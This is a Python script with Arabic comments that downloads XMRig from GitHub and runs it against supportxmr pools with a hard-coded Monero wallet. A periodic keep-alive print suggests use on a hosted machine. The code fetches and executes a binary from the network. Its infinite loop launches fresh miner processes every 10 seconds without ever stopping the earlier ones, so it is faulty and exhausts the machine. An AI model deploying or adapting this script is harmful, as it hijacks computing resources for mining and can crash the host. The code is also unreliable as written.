import os
import subprocess
import psutil
import time
import urllib.request
import tarfile

# ----------------- الإعدادات -----------------
xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
xmrig_dir = os.path.expanduser("~/xmrig")
wallet_address = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
pools = ["pool.supportxmr.com:3333", "pool.supportxmr.com:5555"]
threads_per_instance = 1

# ----------------- تحميل وفك ضغط XMRig إذا لم يكن موجود -----------------
if not os.path.exists(xmrig_dir):
    os.makedirs(xmrig_dir, exist_ok=True)
    print("تحميل XMRig...")
    tar_path = os.path.join(xmrig_dir, "xmrig.tar.gz")
    urllib.request.urlretrieve(xmrig_url, tar_path)
    print("فك ضغط XMRig...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=xmrig_dir)
    os.remove(tar_path)

# البحث عن ملف التشغيل
xmrig_exe = None
for root, dirs, files in os.walk(xmrig_dir):
    for f in files:
        if f == "xmrig":
            xmrig_exe = os.path.join(root, f)
            break
    if xmrig_exe:
        break

if not xmrig_exe:
    raise FileNotFoundError("ملف XMRig لم يتم العثور عليه بعد التحميل.")

os.chmod(xmrig_exe, 0o755)

# ----------------- إعداد النسخ -----------------
total_threads = psutil.cpu_count(logical=True)
instances = len(pools)
processes = []

# ----------------- حلقة النشاط -----------------
last_print = time.time()
while True:
    for i in range(instances):
        start_thread = i * threads_per_instance
        end_thread = start_thread + threads_per_instance - 1
        cmd = [
            xmrig_exe,
            "-o", pools[i],
            "-u", wallet_address,
            "-k",
            "--cpu-priority", "5",
            f"--cpu-affinity={start_thread}-{end_thread}"
        ]
        p = subprocess.Popen(cmd)
        processes.append(p)

    # التحقق من الطباعة كل 5 دقائق
    if time.time() - last_print >= 300:  # 300 ثانية = 5 دقائق
        print("أنا أعمل الآن")
        last_print = time.time()

    time.sleep(10)  # مهلة 10 ثواني قبل إعادة التحفيز

